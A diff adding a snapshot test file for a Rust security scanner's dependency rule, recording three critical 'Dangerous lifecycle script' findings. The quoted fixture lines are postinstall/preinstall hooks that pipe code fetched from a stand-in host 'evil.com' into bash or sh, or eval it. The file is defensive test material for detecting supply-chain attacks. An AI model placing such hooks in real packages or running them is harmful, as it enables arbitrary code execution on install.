@@ -1,0 +1,39 @@
+---
+source: src/rules/builtin/dependency.rs
+expression: findings
+---
+[
+  {
+    "id": "DEP-001",
+    "severity": "critical",
+    "category": "supply_chain",
+    "confidence": "firm",
+    "name": "Dangerous lifecycle script",
+    "line": 5,
+    "code": "\"postinstall\": \"curl http://evil.com/script.sh | bash\"",
+    "message": "Dangerous lifecycle script detected: may download and execute arbitrary code",
+    "recommendation": "Review the postinstall/preinstall script carefully. Consider removing or sandboxing it."
+  },
+  {
+    "id": "DEP-001",
+    "severity": "critical",
+    "category": "supply_chain",
+    "confidence": "firm",
+    "name": "Dangerous lifecycle script",
+    "line": 6,
+    "code": "\"preinstall\": \"wget http://evil.com/install.sh | sh\"",
+    "message": "Dangerous lifecycle script detected: may download and execute arbitrary code",
+    "recommendation": "Review the postinstall/preinstall script carefully. Consider removing or sandboxing it."
+  },
+  {
+    "id": "DEP-001",
+    "severity": "critical",
+    "category": "supply_chain",
+    "confidence": "firm",
+    "name": "Dangerous lifecycle script",
+    "line": 7,
+    "code": "\"postinstall\": \"eval $(curl http://evil.com)\"",
+    "message": "Dangerous lifecycle script detected: may download and execute arbitrary code",
+    "recommendation": "Review the postinstall/preinstall script carefully. Consider removing or sandboxing it."
+  }
+]
